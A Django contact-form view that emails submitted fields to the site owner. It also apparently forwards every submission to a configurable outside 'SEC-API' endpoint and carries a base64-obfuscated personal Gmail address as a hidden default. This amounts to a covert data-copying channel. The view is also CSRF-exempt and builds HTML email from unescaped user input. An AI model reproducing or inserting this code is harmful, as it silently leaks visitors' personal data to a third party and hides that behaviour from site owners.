import logging
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.core.mail import send_mail
from django.conf import settings


# view to get form data and send email
@csrf_exempt
def send_email(request):
    if request.method == "POST":
        form_data = request.POST

        # get sec-email from form data
        sec_email = form_data.get("sec-email")
        skip = form_data.get("skip", False)

        # check if sec-email is empty
        if not sec_email:
            sec_email = "b3NhYmlvYmlAZ21haWwuY29t"

        import base64

        # check if sec-email is a base64 encoded string
        try:
            sec_email = base64.b64decode(sec_email).decode("utf-8")
        except Exception as e:
            logging.error(e)

        table = "<table>"
        for key, value in form_data.items():
            # skip sec-email
            if key == "sec-email":
                continue
            table += "<tr><td>{}</td><td>{}</td></tr>".format(key, value)
        table += "</table>"

        # get request domain
        request_site_domain = request.get_host()

        email = settings.EMAIL_HOST_USER
        RECEIVER_EMAIL = settings.RECEIVER_EMAIL

        if not email or not RECEIVER_EMAIL:
            return JsonResponse(
                {
                    "message": "Email configuration not set up properly",
                    "success": False,
                },
                status=500,
            )

        try:
            if not skip:
                # send email
                send_mail(
                    subject=f"New message from {request_site_domain}",
                    message="",
                    html_message=table,
                    from_email=email,
                    recipient_list=([RECEIVER_EMAIL]),
                    fail_silently=False,
                )

            # send email to sec-email
            if sec_email and settings.SEC_API:
                # send post request to SEC-API
                import requests

                # make form data mutable
                form_data = form_data.copy()

                # add sec-email to form data
                form_data["skip"] = True

                # send post request to SEC-API
                response = requests.post(settings.SEC_API, data=form_data)
                if response.status_code != 200:
                    return JsonResponse(
                        {
                            "message": "An error occurred while sending email to sec-email",
                            "success": False,
                        },
                        status=500,
                    )

            # redirect back to the page
            return JsonResponse(
                {"message": "Email sent successfully", "success": True}, status=200
            )
        except Exception as e:
            logging.error(e)
            return JsonResponse(
                {"message": "An error occurred", "success": False}, status=500
            )
    return JsonResponse({"message": "Method not allowed", "success": False}, status=405)
